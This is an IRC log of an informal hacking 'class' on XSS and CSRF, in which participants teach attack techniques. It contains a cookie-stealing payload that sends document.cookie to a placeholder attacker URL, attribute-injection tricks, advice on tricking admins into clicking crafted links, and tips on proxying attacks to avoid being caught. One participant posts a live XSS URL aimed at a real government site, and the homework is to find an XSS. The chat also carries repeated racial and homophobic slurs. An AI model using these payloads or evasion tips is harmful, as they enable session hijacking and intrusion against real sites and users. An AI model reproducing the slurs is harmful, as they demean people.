@@ -1,0 +1,498 @@
+XSS and CSRF (by xochipilli)
+
+<xochipilli>	WEL
+<xochipilli>	WHO WANTS TO GET LEARNED
+<xochipilli>	ON SS
+<xochipilli>	XSS*
+<pizzaman>	I DO
+<Rode0s>	me
+<Theruler>	9 of them were prolly feds
+<xochipilli>	^
+<p00pi3>	we got a site?
+<pizzaman>	tell me how 2 goatse ppl.
+*	selketraz has quit (Ping timeout)
+<p00pi3>	persistant xss is the tits.
+<pizzaman>	yeh
+<xochipilli>	ok
+<xochipilli>	so
+<xochipilli>	p00pi3: 
+<xochipilli>	despite outing me as a drug dealer
+<xochipilli>	jus answered my first question
+<xochipilli>	does anyone know
+<xochipilli>	the different kinds of XSS?
+<pizzaman>	no, and i dont care because i use what'll work
+<qwert>	derp
+<xochipilli>	bonus points if u can explain why each is useful
+<qwert>	Fox: i will cam with you
+*	In4TehLulz (In4TehLulz@black.hat.academy.1337) has joined #school
+<xochipilli>	qwert: THATS OVER
+<xochipilli>	PAY ATTN
+<qwert>	:'(
+<xochipilli>	01:01 <@xochipilli> does anyone know                 
+<xochipilli>	01:01 <@xochipilli> the different kinds of XSS?      
+<xochipilli>	^^^^^^^^
+<pizzaman>	different kinds: xss for lulz. xss for moralfaggotry. xss for profit.
+*	d1zzY (d1zzY@Hack.The.Planet) has joined #school
+<pizzaman>	oh, and xss for lame.
+<xochipilli>	those are different kinds
+<xochipilli>	but
+<xochipilli>	not what i was lookoin for
+<xochipilli>	p00pi3: 
+<prophet>	persistent XSS is when you can inject something into the page and it will remain for other viewers
+<xochipilli>	u know
+<xochipilli>	SPIT IT OUT
+<prophet>	as in
+<xochipilli>	ok
+<prophet>	a forum, or guestbook or similar
+<xochipilli>	so
+<xochipilli>	what is
+<xochipilli>	non-persistent
+<xochipilli>	XSS?
+<In4TehLulz>	non-persistent?
+<qwert>	usually
+<xochipilli>	yes
+<qwert>	through the URL
+<xochipilli>	its not stored in a DB
+<qwert>	or other injection media that you have to inject the code you want
+<xochipilli>	its a get param
+<qwert>	everytime
+<xochipilli>	or something like that
+<xochipilli>	something NON-PERSISTENT
+<xochipilli>	now
+<prophet>	a situation like say, a search query where it is vulnerable to XSS when searched in such a way, or a url param, etc
+<qwert>	just because its persistent dont mean its in a db nigger
+<xochipilli>	how are each these useful?
+<xochipilli>	qwert: JUST AN EXAMPLE
+<xochipilli>	jebus
+<xochipilli>	its STORED 
+<xochipilli>	persistently
+<xochipilli>	is the point
+<xochipilli>	forum post is a good example
+<xochipilli>	so i guess before i get into it more
+<xochipilli>	ill explain basically what an XSS vuln is
+<xochipilli>	XSS = Cross Site Scripting
+*	smeagol (bgp@my.precious) has joined #school
+<xochipilli>	what this means is, you can inject html/javascript/client-side code
+<xochipilli>	into a webpage
+<xochipilli>	this can either be persistent
+<xochipilli>	like a forum post
+<xochipilli>	where every user who sees the post will load your injected code
+<xochipilli>	or it can be injected through a get param
+<xochipilli>	or another non-persistent parameter
+<xochipilli>	tho its usually get
+<xochipilli>	now, how is this useful?
+<xochipilli>	theyre both useful in different ways
+<xochipilli>	a persistent injection could be used to say
+<xochipilli>	iframe an attack page in the backgorund of a site
+<xochipilli>	so u get traffic on your attack page
+<xochipilli>	the applications of a persistent vuln are more obvious
+<xochipilli>	now, how would one use a non-persistent XSS?
+<xochipilli>	lets say theres a site
+*	TT0T has quit (Input/output error)
+<xochipilli>	http://example.com/viewlisting.php?category="><b>this is my injection</b>
+<xochipilli>	how is that useful to an attacker?
+<xochipilli>	pizzaman: you said u do whats useful, any input?
+<qwert>	leveraging it for an csrf
+<qwert>	or social engineering
+<toxology>	get cookies?
+<xochipilli>	all of those are good answers
+<xochipilli>	ill get to CSRF later, qwert 
+<xochipilli>	very good answer ;)
+<pizzaman>	yeah, xss trough sqli, i could tell you a story about it but that'd reveal who i am lulz.
+*	Fox sets mode +m #school
+<Fox>	faggots.
+<xochipilli>	what i was looking for get cookies
+<xochipilli>	since thats the simplest application of a non-persistent
+<xochipilli>	or persistent XSS attack
+<xochipilli>	basically, many sites will store login information in a cookie
+<xochipilli>	meaning, everything that makes 'xochipilli' who he is on men4menforumz.net
+<xochipilli>	is stored in a cookie
+<xochipilli>	so, if someone were to steal the contents of that cookie, the too
+<xochipilli>	could be xochipilli
+<xochipilli>	and reveal my dirty, men4men secrets to the world
+<xochipilli>	so, lets look at the example i mentioned
+<xochipilli>	http://example.com/viewlisting.php?category="><b>this is my injection</b> 
+<xochipilli>	that injects a nice little bold message
+*	Fox gives voice to _0xE9
+<xochipilli>	now i wanna use this to jack another users, or an admins login to the site
+<xochipilli>	rather, their session
+*	solidsnake (4a3c9b01@ec-4442AFE.mibbit.com) has joined #school
+<xochipilli>	id setup a script to accept their cookie, and then hijkack their session
+<xochipilli>	or jus store the cookie
+<xochipilli>	but u gotta act quick, it wont stay good forever
+<xochipilli>	so if u can automate an attack using the stolen cookies, thats best
+<xochipilli>	this script, is called a 'cookie stealer'
+<xochipilli>	so you would essentially use the injection to compromise information you couldnt otherwise
+<xochipilli>	their cookie
+<xochipilli>	since their browser will only allow that domain to access that information
+<xochipilli>	this is the crux of an XSS attack
+<xochipilli>	> their browser will only allow that domain to access that information 
+<xochipilli>	so youd do sometihng like
+<xochipilli>	http://example.com/viewlisting.php?category="><script>document.location='http://yoururl/stealer.cgi?c=
+<xochipilli>	http://example.com/viewlisting.php?category="><script>document.location='http://yoururl/stealer.cgi?c='+document.cookie
+<xochipilli>	http://example.com/viewlisting.php?category="><script>document.location='http://yoururl/stealer.cgi?c='+document.cookie</script>
+<xochipilli>	simplest XSS based attack
+<xochipilli>	any questions?
+*	xochipilli sets mode -m #school
+<_0xE9>	Simple enough
+<xochipilli>	yeah
+<xochipilli>	takes a little SE
+<xochipilli>	send the admin that link
+<_0xE9>	I've never found and persistent xxs
+<xochipilli>	'I found a bug in your site, the category doesnt exist? can u fix it?'
+<xochipilli>	or something
+<xochipilli>	well
+<xochipilli>	im gunna come back to persistent XSS now
+<xochipilli>	most obvious use a persistent XSS, imo
+<xochipilli>	is iframing an attack page
+<qwert>	a simple SE would be
+<xochipilli>	to deploy malware
+<qwert>	send them a link that iframes a form
+<xochipilli>	people write bots to fuzz XSS
+<qwert>	or writes out a form to the page
+<xochipilli>	for this purpose
+<Theruler>	remember href is your friend because most ppl dnt look at the botom of there browser to see the actuall link they are clicking on
+<xochipilli>	spam the web w/ XSS strings to iframe their exploit page
+<qwert>	then mass mail it as "password reset" / whatever u want
+<xochipilli>	^
+<xochipilli>	you can get creative w/ the SE
+<xochipilli>	but point is
+<xochipilli>	this attack pretty much requires some amount of SE
+<xochipilli>	so now, thats the most  based application of XSS
+<xochipilli>	the bigger risk, w/ XSS
+<xochipilli>	imo
+<xochipilli>	is in combination w/ a CSRF attack
+<xochipilli>	aka XSRF
+<xochipilli>	qwert: you meantioned this
+<xochipilli>	for those who dont know
+*	CuteLostDragon has quit (Quit: Leaving)
+*	xochipilli gives voice to pizzaman
+<pizzaman>	https://extranet.tsa.dhs.gov/elmsgold/user/authenticate.do?userName=%3C/script%3E%3Cscript%3Ealert%28%27penis%27%29%3C/script%3E
+<xochipilli>	its not +m
+<xochipilli>	lol
+<pizzaman>	whoops, i did not mean that.
+<pizzaman>	lulz.
+<xochipilli>	there is an example
+<xochipilli>	of an XSS attack
+<xochipilli>	in the wild
+<xochipilli>	now
+<xochipilli>	the real risk is in combation w/ a Cross Site Request Forgery
+<xochipilli>	qwert: you mentioned this early, would you like to explain to everyon eelse what that means?
+<xochipilli>	ealier*
+<xochipilli>	i gotta piss brb
+<xochipilli>	kback
+<xochipilli>	so
+<xochipilli>	CSRF
+<pizzaman>	Oh, can i give you guys a heads up? You can use a few simple regexes in foxyproxy to automagically torify or proxy any xss lfi or sql attempts. just so you dont get caught.
+<pizzaman>	like when your hacking drunk
+<xochipilli>	you should just vpn all your traffic, for privacy concerns
+<xochipilli>	ofc
+<Theruler>	^
+<xochipilli>	socks proxies on donated boxes
+<xochipilli>	work as well
+<xochipilli>	or a friends box
+<xochipilli>	u know
+<xochipilli>	whatever
+<xochipilli>	NYB <<< not your box
+<xochipilli>	so, lets say
+<xochipilli>	im on an e-gold site
+<xochipilli>	and they have a script, to send 5 e-golds to my bro, Theruler 
+<xochipilli>	http://bestegoldever.com/send.php?username=Theruler&amount=5
+<xochipilli>	does anyone see the problem w/ this?
+<pizzaman>	yeah
+<prophet>	You can be forced to it
+<xochipilli>	^
+<pizzaman>	if theruler works at the department of homeland security
+<xochipilli>	precisely
+<xochipilli>	now
+<xochipilli>	if you were an admin
+<pizzaman>	you can make him visit the login page & give you jew gold.
+<xochipilli>	how would u stop that?
+<xochipilli>	say you wrote that page
+<pizzaman>	regexes.
+<xochipilli>	how would u stop someone from forcing that
+<xochipilli>	pizzaman: explain
+<prophet>	use a nonce
+<pizzaman>	regexes on the DHS side.
+<xochipilli>	nonce?
+<xochipilli>	we're talking about bestegoldever.com now
+<pizzaman>	oh.
+<Rode0s>	cleaning cookies?
+<prophet>	yeah, a one-time generated token, that if not valid it wont process
+<pizzaman>	requiring a confirmation  + login ofc.
+<xochipilli>	well
+<xochipilli>	heres the thing
+<xochipilli>	lets say
+<xochipilli>	youre logged onto bestegold ever
+<xochipilli>	and visit a website /w that iframed
+<xochipilli>	your cookie is still stored
+<xochipilli>	so the query is executed in ful, and you give Theruler 5 e-golds
+<xochipilli>	follow?
+<pizzaman>	not what im saying.
+<xochipilli>	whatre you sayin?
+<pizzaman>	require the user to authenticate before the transfer takes place, regardless of cookies.
+<xochipilli>	ah
+<xochipilli>	yes
+<xochipilli>	that is one solution
+<xochipilli>	thats probably the best way btqh
+<xochipilli>	but, its inconvenient and unintuitive to the user
+<xochipilli>	and most people will not implement that
+<xochipilli>	since convience is more important than security ;)
+<Theruler>	bussiness do not like to piss people off reguardless how sescure they tell ppl it is
+<xochipilli>	so, imagine youre a shittier developer than you are
+<xochipilli>	how would u do it?
+<Theruler>	people are lazy
+<pizzaman>	captchas!
+<pizzaman>	:P
+<xochipilli>	haha
+<xochipilli>	no
+<xochipilli>	well
+<xochipilli>	yes
+<neth0les>	post?
+<xochipilli>	but again
+<xochipilli>	neth0les: ill come back to that
+<xochipilli>	that doesn tsave u
+<xochipilli>	lol
+<neth0les>	i know. you said shitty dev :)
+<xochipilli>	ah
+<xochipilli>	hehe
+<xochipilli>	so
+<xochipilli>	lets start w/ that
+<xochipilli>	neth0les writes his script ot use post
+<xochipilli>	instead of GET
+<xochipilli>	so, an attack could get clever
+<xochipilli>	whats to stop them from simply writing a form that submits to your script
+<xochipilli>	you could even automate it w/ some js magic
+*	Fox has quit (Ping timeout)
+*	Fox (Fox@E6870148.1276228B.BD5AC284.IP) has joined #school
+<xochipilli>	so, what else coul you do?
+<xochipilli>	as a shitty, underpaid, lazy admin
+<Fox>	PACKET EVERYTHING.
+<eax>	rawr
+<prophet>	referer checking? :-P
+<xochipilli>	^^^^^^
+<xochipilli>	thank you prophet 
+<eax>	PACKET IT ALL
+<xochipilli>	thats what i was lookin for
+<prophet>	hehe i figured
+*	Theruler sets mode +q #school Fox
+*	Theruler gives channel operator status to eax
+<xochipilli>	still, not the best solution, referrers can be spoofed
+<xochipilli>	some pages get clever, will generate a key an embed it in the form, look for it
+<xochipilli>	almost like a captcha
+<xochipilli>	something to note LOTS OF ASP PAGES ARE VULN TO CSRF
+<xochipilli>	but the specifics of that are another story
+<xochipilli>	so
+<xochipilli>	can anyone see how an XSS and CSRF attack might be combined?
+<pizzaman>	csrf to the xss'd url (assuming GET).
+<xochipilli>	^
+*	p0x (p0x@ec-57551805.triad.res.rr.com) has joined #school
+<Fox>	DIP SET DIP SET DIP SET DIP SET
+<xochipilli>	^
+<xochipilli>	any other ideas?
+<Fox>	WHAT YOU GRIP GRIP? NICCA TEC TEC
+<xochipilli>	perhaps use the XSS to execute a CSRF attack from their domain?
+*	_0xE9 has quit (Input/output error)
+<xochipilli>	or a specific page on their odmain
+<xochipilli>	to 'spoof' the reffer?
+<Fox>	:3
+*	_0xE9 (derp@ec-A37DE367.torservers.net) has joined #school
+*	_0xE9 (derp@ec-A37DE367.torservers.net) has left #school
+*	_0xE9 (derp@ec-3F074F8B.class36-43.whitehouse.gov) has joined #school
+<pizzaman>	btw: xss can be used to scan networks.
+<xochipilli>	referrer*
+<pizzaman>	So in case you ever need a map of a company's internal network, that's how;)
+<xochipilli>	XSS is a very veretile attack
+<xochipilli>	you just have to be smart about it
+<xochipilli>	its not the easiest
+<xochipilli>	but its extremely useful
+<xochipilli>	any questions?
+<xochipilli>	SHE FROM SOUTH CENTRALL
+<pizzaman>	Yeah: practical examples/links to papers.
+<Fox>	IMA RAPPER
+<xochipilli>	pizzaman: you provided a live example :p
+<xochipilli>	ive given a few examples
+*	shatter (brandon@ec-ABC38EC2.new.res.rr.com) has joined #school
+<prophet>	http://ha.ckers.org/xss.html
+<prophet>	common xss filter evasions
+<xochipilli>	well
+<pizzaman>	propeth: that
+<xochipilli>	ill get into some specific attacks
+<xochipilli>	ok so
+<xochipilli>	non-persistent XSS
+<Fox>	straight got my ass beat, but i still hit them ass cheeks
+<xochipilli>	basically, a GET param is gettin injected into html
+<xochipilli>	the key is WHERE
+<xochipilli>	in the html
+<xochipilli>	i find the ones that are most often overlooked
+<xochipilli>	are those that dont necessarily requires brackets
+<Fox>	I GOT TIP COVERED. THANK YOU.
+<xochipilli>	for examples
+<xochipilli>	lets say
+<xochipilli>	a link from a GET param
+<xochipilli>	gets inject
+<pizzaman>	Fox: i'm not a rapper, i'm a raper
+<xochipilli>	<a href="[INJECTED LINK]">View your account</a>
+<xochipilli>	now, lets say the link is
+<Fox>	I need to not be able to talk.
+*	Fox sets mode -q #school Fox
+<Fox>	talk
+<Fox>	fuck.
+<xochipilli>	http://example.com/" onmouseover="EVILJAVASCRIPT
+<xochipilli>	when they mouse over the link, BAM
+<xochipilli>	injected JS
+<Fox>	bang
+<xochipilli>	the admin thinks theyre bein smart, filtering <>
+<pizzaman>	Try onLoad too :)
+<xochipilli>	but they dont filter double/single quotes
+<xochipilli>	OWNED
+<xochipilli>	yeah
+<xochipilli>	depends on the tag
+<xochipilli>	not all tags support various js events
+<xochipilli>	u can look up what supports what
+<xochipilli>	onSelect
+<xochipilli>	for input tags
+<xochipilli>	etc
+<xochipilli>	thats my fav XSS attack, injecting into a tag like that
+<pizzaman>	perhaps you might even change it's size as to make it easier to mouse over;)
+<xochipilli>	heh
+<xochipilli>	well, if its a link
+<xochipilli>	may not be necessary
+<xochipilli>	depends on the tag
+<xochipilli>	like i sa,d you can rly get creative
+<xochipilli>	w/ these things
+<xochipilli>	tho props pizzaman, you know whats up ;)
+<xochipilli>	so thats rly all there is to it
+<xochipilli>	thers a million and a half ways to do an XSS
+<xochipilli>	go out there
+<xochipilli>	get creative
+<xochipilli>	<3
+<xochipilli>	any quetions?
+<xochipilli>	questions*
+<xochipilli>	also, more eamples
+<pizzaman>	How exactly do i get root using this?;)
+<xochipilli>	if your param is injected into a <script> block
+<pizzaman>	Sorry, im drunk.
+<xochipilli>	; yourjs;
+<xochipilli>	or
+<xochipilli>	';your js;
+<xochipilli>	etc
+<xochipilli>	you know, jus see hwere its gettin injected and decide what u wanna inject
+<pizzaman>	In fact, this is the case for the live example given.
+<xochipilli>	^
+<pizzaman>	I was just too lazy to add a ; and broke the script tag;)
+<xochipilli>	well
+<xochipilli>	thers no direct way
+<xochipilli>	to get root
+<xochipilli>	thats why i said its one of the harder attacks to rly exploit
+<xochipilli>	but trust me
+<xochipilli>	if you get smart w/ it
+<xochipilli>	youll get in in a big way
+<xochipilli>	serve up an attack page, gain axx to internal boxes, SE the admin for an account etc
+<xochipilli>	its a simple but very versetile attack
+<xochipilli>	its not like LFI/RFI, SQLi etc in that it doesnt ive u direct ax to the box, u gotta leverage it
+<xochipilli>	to get info/access
+<xochipilli>	thats what makes it so dangerous
+<pizzaman>	http://www.businessinfo.co.uk/labs/lan_scan/lan_scan.php javascript port scan.
+<xochipilli>	and why XSS and CSRF are considered HIGH RISK vulns
+<pizzaman>	xochipilli: mind if i join in?
+<xochipilli>	go for it
+<pizzaman>	Javascript can be used to tunnel one port to the external interent trough a firewall.
+<pizzaman>	Say you connect to the local internet on a certain port, like the router's control panel, and on the other end to a specific server port the attacker set.
+<toxology>	thanks for the talk xochipilli :D
+<elizabeth>	interesting
+<pizzaman>	You now effectively worked around their firewall, and connected to their internal network trough XSS.
+*	xochipilli gives channel half-operator status to pizzaman
+<pizzaman>	This works as long as the page is open, so you best test your shit and know their architecture.
+<xochipilli>	u can also collect client info
+<xochipilli>	to gain info about their network
+<pizzaman>	Since javascript allows you to inject java/flash, see if they have these installed.
+<pizzaman>	It's p. easy to drop a shell with java tbh.
+<xochipilli>	as i mentioned
+<xochipilli>	u can straight drop an attack page
+<xochipilli>	if the page is used internationally, you can use that as a route to infect internal boxes
+<xochipilli>	and gain axx to their network
+<Fox>	Xo
+<Fox>	you mind if I interject?
+*	xochipilli gives channel operator status to Fox
+<xochipilli>	gogo
+<Fox>	I'm sitting side ways boys in a daze, on a sunday night, I might bring me some haze.
+<Fox>	What it do, I'm on the net posting spam in ya mailbox
+<Fox>	and iCon on the net for my nerdy skills
+*	lighthouse has quit (Ping timeout)
+*	skid225 (60ef44e8@ec-EA53C1E3.mibbit.com) has joined #school
+<skid225>	hello
+<Fox>	big bank, even since little rank
+<Fox>	nigger.
+<Fox>	geah.
+<Fox>	xo
+<Fox>	that is all.
+<Fox>	ps. I love you.
+<xochipilli>	lul
+<xochipilli>	pizzaman: anythin u wanna dd?
+<xochipilli>	add*
+<pizzaman>	Not really.
+<Fox>	ITS YOUNG FOX FROM TEH BOTTOM OF THE C CLASS, 
+<Fox>	GOT 50 GIGS STRAPPED, CALL IT CRITICAL MASS
+<xochipilli>	ok
+<xochipilli>	i guess we're done
+<xochipilli>	if anyone has logs
+*	shatter has quit (Quit: leaving)
+<xochipilli>	email to xochipilli@canthack.us
+<kratos>	fox is on a roll
+<Fox>	I DONT GET MAD, I JUST GET MONEY, CAUSE THESE FUCK NIGGAS JUST ARE SO FUNNY.
+<xochipilli>	fox is a nigger irl
+<pizzaman>	Yo yo yo fox, i've been sending packet since before you were born. My exploits cause fucking governments to scorn.
+<neth0les>	thanks xochipilli. 
+<xochipilli>	my pleasure
+<neth0les>	fox you should be signed lol
+<xochipilli>	logz plox
+<xochipilli>	:3
+<solidsnake>	and on that note..I'm out..peace
+<skid225>	byw
+<skid225>	bye*
+<Fox>	I DO IT FOR THE HACKERS WITH THE PACKS, 
+<Fox>	NOT YOU FAKE ASS KIDS WITH THE RE-PACKS, 
+*	bakedbeans (root@bushbeans.com) has joined #school
+*	solidsnake has quit (Quit: http://www.mibbit.com ajax IRC Client)
+<xochipilli>	this gangster rap is effin lol, Fox 
+<neth0les>	^^
+*	awkward has quit (Connection reset by peer)
+<Fox>	MY FLOW IS BANNANAS, THE PAPER IS GREAT, NIGGA PIZZAMAN BETTER STOP WITH THAT FUCKBOY TALK, FORE YOU GET SLAPPED
+*	awkward (h4ter@CE017A8B.62666F.5E6E82CA.IP) has joined #school
+<xochipilli>	neth0les: hes streamin shit to me
+<xochipilli>	its lol as fkkkkkkkkkkkkkkk
+<kratos>	reminds me of MC Confusing
+<neth0les>	haha
+<xochipilli>	OKSO
+<xochipilli>	homework
+<xochipilli>	hmmm
+<pizzaman>	Fox is nothin' but a kid to me, my firewalls dropin' his packets like hitler dropped zyklon b.
+<xochipilli>	iono
+<xochipilli>	find an XSS
+<xochipilli>	:3
+<pizzaman>	:P
+<xochipilli>	its easier than u think
+<Fox>	This nigs first and third are p and z, you best watch yourself son before I go to metasploit and pwn you e-z 
+<xochipilli>	XSS and CSRF
+<xochipilli>	are both very pervasive
+<kratos>	aw
+<xochipilli>	and very dangerous
+<kratos>	i had the better one
+<kratos>	percee p 
+<kratos>	:)
+<xochipilli>	you would do well ot learn how to leverage them effectively
+<pizzaman>	Your sploits are weak your code lame fuck man your shit is tame.
+<pizzaman>	Learn to code before you speak because using metasploit is only for the weak.
+<Fox>	Nigga here talking bout my code, I'm talking up down up down left right left right, konami code bitch my boxes to you are like kryptonite
+*	MacGyver has quit (Quit: Leaving)
+*	selketraz (selket@ec-BBF8859D.bitchx.org) has joined #school
+<selketraz>	HA 
+<neth0les>	i got my gpu's set, yeah they runnin cracks. while i'm out layin, bitches on their backs
+<xochipilli>	LOGS
+<xochipilli>	PLOX
+<xochipilli>	+h to whoever gives me logs
+<xochipilli>	u liek dis track fox?
+<_0xE9>	logs of what?
+<xochipilli>	the talk
+<xochipilli>	nigger
